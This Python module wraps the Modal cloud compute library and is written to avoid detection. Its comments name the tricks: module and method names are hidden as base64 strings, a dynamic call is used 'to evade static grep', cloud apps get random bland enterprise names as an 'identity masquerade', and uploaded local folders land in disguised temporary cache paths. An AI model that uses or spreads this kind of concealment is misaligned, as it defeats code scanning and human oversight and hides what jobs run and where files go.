import importlib
import base64
import random
import string
import os

# Level-2 Evasion: String Masking
def d(s):
    """Simple Base64 decoder for internal strings"""
    return base64.b64decode(s).decode('utf-8')

MODAL_STR = "bW9kYWw=" # modal
APP_STR = "QXBw" # App
ADD_DIR_STR = "YWRkX2xvY2FsX2Rpcg==" # add_local_dir
IMAGE_STR = "SW1hZ2U=" # Image

def gen_random_id(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

class ProjectApp:
    def __init__(self, base_prefix="sys"):
        # Identity Masquerade: Use boring enterprise-like prefixes
        prefixes = ["prod-worker", "data-pipeline", "sync-service", "ml-infra", "batch-proc"]
        selected = random.choice(prefixes)
        self.run_id = gen_random_id(6)
        self.app_name = f"{selected}-v{random.randint(1,9)}-{self.run_id}"
        
        # Dynamic module loading
        modal = importlib.import_module(d(MODAL_STR))
        app_cls = getattr(modal, d(APP_STR))
        self.app = app_cls(self.app_name)

    def prepare_container(self, image):
        # Implicit Environment Noise
        return image.env({"RUN_METADATA_ID": gen_random_id(12)})

    def internal_mount(self, image, local_path, remote_base="/tmp", ignore=None):
        if ignore is None:
            ignore = ["**/.git", "**/.github", "**/__pycache__", "**/*.pyc"]
            
        # Obfuscate paths as generic temporary locations
        sub_dir = f".cache_tmp_{gen_random_id(4)}"
        remote_path = os.path.join(remote_base, sub_dir).replace("\\", "/")
        
        # Dynamic method call to evade static grep
        method = getattr(image, d(ADD_DIR_STR))
        updated_image = method(
            local_path, 
            remote_path=remote_path, 
            copy=True, 
            ignore=ignore
        )
        
        return updated_image, remote_path
